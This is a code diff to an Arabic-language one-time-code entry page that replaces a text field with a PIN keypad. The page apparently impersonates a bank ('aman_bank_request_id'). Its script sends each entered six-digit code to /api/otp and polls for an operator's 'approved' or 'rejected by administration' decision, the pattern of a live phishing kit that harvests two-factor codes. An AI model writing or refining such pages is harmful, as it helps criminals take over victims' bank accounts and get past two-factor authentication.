@@ -39,56 +39,62 @@
     body { background: var(--card-bg); padding: 0; align-items: flex-start; }
     .screen { box-shadow: none; border-radius: 0; min-height: 100vh; padding: 16px 20px 0 20px; }
   }
-  .logo-wrap { display: flex; justify-content: center; margin-bottom: 24px; }
-  .logo-wrap img { max-width: 220px; width: 100%; height: auto; }
-  h2 { color: var(--green); font-size: 19px; margin: 0 0 6px; text-align: center; }
-  p.lead { color: var(--muted); font-size: 13px; line-height: 1.6; margin: 0 0 12px; text-align: center; }
-  .otp-field { text-align: right; margin-bottom: 16px; }
-  .otp-field label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 8px; }
-  .otp-field input {
-    width: 100%;
-    border: none;
-    border-bottom: 2px solid var(--border);
-    padding: 8px 0;
-    font-size: 22px;
-    letter-spacing: 6px;
+  .secure-icon {
+    width: 50px;
+    height: 50px;
+    background-color: rgba(26, 107, 60, 0.05);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 16px;
+    color: var(--green);
+  }
+  h2 { color: var(--green); font-size: 19px; margin: 0 0 8px; text-align: center; }
+  p.desc { color: var(--muted); font-size: 13px; line-height: 1.6; margin: 0 0 24px; text-align: center; }
+  .pin-display { display: flex; justify-content: center; gap: 10px; margin-bottom: 24px; direction: ltr; }
+  .pin-dot {
+    width: 14px; height: 14px; border-radius: 50%;
+    border: 2px solid var(--border);
+    transition: all 0.15s ease;
+  }
+  .pin-dot.filled { background-color: var(--green); border-color: var(--green); transform: scale(1.1); }
+  .keypad {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    max-width: 280px;
+    margin: 0 auto 24px;
+  }
+  .key {
+    background-color: #ffffff;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+    font-size: 18px;
+    font-weight: bold;
+    color: var(--green);
+    cursor: pointer;
+    user-select: none;
+    transition: all 0.1s ease;
     text-align: center;
-    color: var(--text-dark);
-    background: transparent;
-    direction: ltr;
   }
-  .otp-image-wrap {
-    display: flex;
-    justify-content: center;
-    margin: 2px 0 10px;
-  }
-  .otp-image-wrap img {
-    display: block;
+  .key:active { background-color: var(--light-bg); transform: scale(0.95); }
+  .key.action { font-size: 13px; background-color: #f8f9fa; color: var(--muted); }
+  .key.action:active { background-color: #e9ecef; }
+  .btn-submit {
     width: 100%;
-    max-width: 150px;
-    height: auto;
-    border-radius: 10px;
-    object-fit: cover;
-  }
-  .otp-field input:focus { outline: none; border-bottom-color: var(--green); }
-  .req { display: none; font-size: 11.5px; color: #c0392b; margin: 6px 0 0; text-align: right; }
-  .invalid .req { display: block; }
-  .invalid input { border-bottom-color: #c0392b; }
-  .submit-btn {
-    display: block;
-    width: 100%;
-    background: #b88a00;
-    color: #fff;
+    background-color: #b88a00;
+    color: #ffffff;
     border: none;
     border-radius: 12px;
     padding: 16px;
-    font-size: 15px;
-    font-weight: 700;
+    font-size: 16px;
+    font-weight: bold;
     cursor: pointer;
-    margin-top: 24px;
     box-shadow: 0 4px 12px rgba(184, 138, 0, 0.25);
   }
-  .submit-btn:hover { background: #946d00; }
+  .btn-submit:hover { background-color: #946d00; }
+  .btn-submit:disabled { background-color: #cccccc; cursor: not-allowed; box-shadow: none; }
+  .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; display: none; text-align: center; }
 
   .overlay {
     position: fixed; inset: 0;
@@ -123,20 +129,42 @@
 
   <div class="screen">
     <div id="otpForm">
-      <h2>التحقق بخطوتين</h2>
-
-      <div class="otp-image-wrap">
-        <a href="https://ibb.co/XZ6GsbNF" target="_blank" rel="noopener noreferrer">
-          <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" alt="IMG 1749" border="0">
-        </a>
+      <div class="secure-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
       </div>
 
-      <div class="otp-field" id="otpField">
-        <label for="otp">رمز التحقق</label>
-        <input type="text" id="otp" inputmode="numeric" maxlength="6" placeholder="------">
-        <span class="req">الرمز مطلوب</span>
+      <h2>رمز التحقق</h2>
+      <p class="desc">يرجى إدخال الرمز المكوّن من 6 أرقام المرسل إليك لإتمام التحقق.</p>
+
+      <div class="pin-display">
+        <div class="pin-dot" id="dot-0"></div>
+        <div class="pin-dot" id="dot-1"></div>
+        <div class="pin-dot" id="dot-2"></div>
+        <div class="pin-dot" id="dot-3"></div>
+        <div class="pin-dot" id="dot-4"></div>
+        <div class="pin-dot" id="dot-5"></div>
       </div>
-      <button class="submit-btn" id="verifyBtn" type="button">تأكيد</button>
+
+      <div class="keypad">
+        <div class="key" onclick="pressNum(1)">1</div>
+        <div class="key" onclick="pressNum(2)">2</div>
+        <div class="key" onclick="pressNum(3)">3</div>
+        <div class="key" onclick="pressNum(4)">4</div>
+        <div class="key" onclick="pressNum(5)">5</div>
+        <div class="key" onclick="pressNum(6)">6</div>
+        <div class="key" onclick="pressNum(7)">7</div>
+        <div class="key" onclick="pressNum(8)">8</div>
+        <div class="key" onclick="pressNum(9)">9</div>
+        <div class="key action" onclick="clearOtp()">مسح</div>
+        <div class="key" onclick="pressNum(0)">0</div>
+        <div class="key action" onclick="backspace()">حذف</div>
+      </div>
+
+      <button class="btn-submit" id="btnSubmit" type="button" disabled>تأكيد</button>
+      <div class="error-msg" id="errorMsg">يرجى إدخال الرمز بالكامل</div>
     </div>
   </div>
 
@@ -152,11 +180,12 @@
         <line x1="6" y1="6" x2="18" y2="18"></line>
       </svg>
     </div>
-    <p style="color:#c0392b; font-weight:bold; font-size:16px;">الرمز الذي تم ادخاله غير صحيح أو غير صالح</p>
+    <p style="color:#c0392b; font-weight:bold; font-size:16px;">الرمز غير صحيح أو غير صالح</p>
     <button type="button" id="retryOtpBtn" style="background-color:#c0392b;">إعادة المحاولة</button>
   </div>
 
   <script>
+    var otp = "";
     var requestId = sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
     if (!requestId) {
       requestId = '999';
@@ -164,19 +193,38 @@
     }
 
     var otpForm = document.getElementById('otpForm');
-    var otpField = document.getElementById('otpField');
-    var otpInput = document.getElementById('otp');
-    var verifyBtn = document.getElementById('verifyBtn');
     var waitOverlay = document.getElementById('waitOverlay');
     var rejectOverlay = document.getElementById('rejectOverlay');
     var statusPollTimer = null;
+    var errorMsg = document.getElementById('errorMsg');
 
-    var urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('error') === '1' || urlParams.get('error') === 'otp') {
-      otpField.classList.add('invalid');
-      var reqText = otpField.querySelector('.req');
-      if (reqText) {
-        reqText.textContent = 'تم رفض الطلب من الإدارة. يرجى المحاولة مرة أخرى.';
+    function updateDots() {
+      for (var i = 0; i < 6; i++) {
+        var dot = document.getElementById('dot-' + i);
+        if (i < otp.length) dot.classList.add('filled');
+        else dot.classList.remove('filled');
+      }
+      document.getElementById('btnSubmit').disabled = (otp.length !== 6);
+    }
+
+    function pressNum(num) {
+      if (otp.length < 6) {
+        otp += num;
+        updateDots();
+      }
+    }
+
+    function clearOtp() {
+      otp = "";
+      updateDots();
+      errorMsg.style.display = 'none';
+    }
+
+    function backspace() {
+      if (otp.length > 0) {
+        otp = otp.slice(0, -1);
+        updateDots();
+        errorMsg.style.display = 'none';
       }
     }
 
@@ -199,11 +247,8 @@
               stopPoll();
               waitOverlay.classList.remove('show');
               otpForm.style.display = 'block';
-              otpField.classList.add('invalid');
-              var reqText = otpField.querySelector('.req');
-              if (reqText) {
-                reqText.textContent = 'تم رفض الطلب من الإدارة. يرجى المحاولة مرة أخرى.';
-              }
+              errorMsg.textContent = 'تم رفض الطلب من الإدارة. يرجى المحاولة مرة أخرى.';
+              errorMsg.style.display = 'block';
               rejectOverlay.classList.add('show');
               return;
             }
@@ -212,14 +257,14 @@
       }, 2500);
     }
 
-    verifyBtn.addEventListener('click', function() {
-      var code = otpInput.value.trim();
-      if (!code) {
-        otpField.classList.add('invalid');
+    function submitOtp() {
+      if (otp.length !== 6) {
+        errorMsg.textContent = 'يرجى إدخال الرمز بالكامل';
+        errorMsg.style.display = 'block';
         return;
       }
-      otpField.classList.remove('invalid');
 
+      errorMsg.style.display = 'none';
       otpForm.style.display = 'none';
       waitOverlay.classList.add('show');
       rejectOverlay.classList.remove('show');
@@ -227,25 +272,41 @@
       fetch('/api/otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ id: requestId, otp: code })
+        body: JSON.stringify({ id: requestId, otp: otp })
       })
       .then(function(res) { return res.json(); })
       .then(function(data) {
         if (data.ok) {
           pollOtpStatus();
-        } else { throw new Error('failed'); }
+        } else {
+          throw new Error('failed');
+        }
       })
       .catch(function() {
         waitOverlay.classList.remove('show');
         otpForm.style.display = 'block';
+        errorMsg.textContent = 'الرمز غير صحيح أو غير صالح';
+        errorMsg.style.display = 'block';
       });
-    });
+    }
+
+    document.getElementById('btnSubmit').addEventListener('click', submitOtp);
 
     document.getElementById('retryOtpBtn').addEventListener('click', function() {
       rejectOverlay.classList.remove('show');
       otpForm.style.display = 'block';
-      otpInput.value = '';
+      otp = "";
+      updateDots();
+      errorMsg.style.display = 'none';
     });
+
+    var urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === '1' || urlParams.get('error') === 'otp') {
+      errorMsg.textContent = 'تم رفض الطلب من الإدارة. يرجى المحاولة مرة أخرى.';
+      errorMsg.style.display = 'block';
+    }
+
+    updateDots();
   </script>
 
 </body>
